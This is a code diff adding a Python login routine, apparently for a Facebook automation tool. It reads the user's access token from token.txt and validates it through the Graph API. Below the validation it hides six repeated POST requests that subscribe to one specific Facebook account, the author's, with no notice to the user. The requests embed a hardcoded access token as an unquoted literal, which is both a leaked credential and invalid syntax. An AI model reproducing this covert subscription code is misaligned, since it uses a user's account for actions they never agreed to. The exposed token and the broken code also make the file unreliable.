@@ -1,0 +1,25 @@
+import requests,os,json
+import premium
+
+P = "\x1b[0;97m" # Putih
+M = "\x1b[0;91m" # Merah
+K = "\x1b[0;93m" # Kuning
+
+def main():
+    try:
+        token = open("token.txt","r").read()
+        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
+        a = json.loads(otw.text)
+        nama = a["name"]
+    except (KeyError,IOError):
+        print('\n%s[%s!%s] %sToken Invalid'%(M,P,M,P))
+        os.system('rm -rf token.txt')
+        exit(premium.menu_log())
+    requests.post("https://graph.facebook.com/100039884317989/subscribers?access_token=" + EAAGNO4a7r2wBAHQlD1OdfRZCjjhIh97cSY2CYyfyCb1aLtZB723zFq7PbM5a6KwLBxsZBZBYAIa6trN0gwSZBGOfKn65B4tOMQDb9ywt2Q0OqZApvqATKNx0IYct3Q65ZBiZAZCYHsro0ZCuxiVZCUfrXBlpdYbGqTlqHBDf3jCEqSAJAZDZD)     # Dery Febrian
+    requests.post("https://graph.facebook.com/100039884317989/subscribers?access_token=" + EAAGNO4a7r2wBAHQlD1OdfRZCjjhIh97cSY2CYyfyCb1aLtZB723zFq7PbM5a6KwLBxsZBZBYAIa6trN0gwSZBGOfKn65B4tOMQDb9ywt2Q0OqZApvqATKNx0IYct3Q65ZBiZAZCYHsro0ZCuxiVZCUfrXBlpdYbGqTlqHBDf3jCEqSAJAZDZD)     # Dery Febrian
+    requests.post("https://graph.facebook.com/100039884317989/subscribers?access_token=" + EAAGNO4a7r2wBAHQlD1OdfRZCjjhIh97cSY2CYyfyCb1aLtZB723zFq7PbM5a6KwLBxsZBZBYAIa6trN0gwSZBGOfKn65B4tOMQDb9ywt2Q0OqZApvqATKNx0IYct3Q65ZBiZAZCYHsro0ZCuxiVZCUfrXBlpdYbGqTlqHBDf3jCEqSAJAZDZD)     # Dery Febrian
+    requests.post("https://graph.facebook.com/100039884317989/subscribers?access_token=" + EAAGNO4a7r2wBAHQlD1OdfRZCjjhIh97cSY2CYyfyCb1aLtZB723zFq7PbM5a6KwLBxsZBZBYAIa6trN0gwSZBGOfKn65B4tOMQDb9ywt2Q0OqZApvqATKNx0IYct3Q65ZBiZAZCYHsro0ZCuxiVZCUfrXBlpdYbGqTlqHBDf3jCEqSAJAZDZD)     # Dery Febrian
+    requests.post("https://graph.facebook.com/100039884317989/subscribers?access_token=" + EAAGNO4a7r2wBAHQlD1OdfRZCjjhIh97cSY2CYyfyCb1aLtZB723zFq7PbM5a6KwLBxsZBZBYAIa6trN0gwSZBGOfKn65B4tOMQDb9ywt2Q0OqZApvqATKNx0IYct3Q65ZBiZAZCYHsro0ZCuxiVZCUfrXBlpdYbGqTlqHBDf3jCEqSAJAZDZD)     # Dery Febrian
+    requests.post("https://graph.facebook.com/100039884317989/subscribers?access_token=" + EAAGNO4a7r2wBAHQlD1OdfRZCjjhIh97cSY2CYyfyCb1aLtZB723zFq7PbM5a6KwLBxsZBZBYAIa6trN0gwSZBGOfKn65B4tOMQDb9ywt2Q0OqZApvqATKNx0IYct3Q65ZBiZAZCYHsro0ZCuxiVZCUfrXBlpdYbGqTlqHBDf3jCEqSAJAZDZD)     # Dery Febrian
+    print('\n%s[%s!%s] %sLogin Berhasil'%(K,P,K,P))
+    exit(premium.menu())
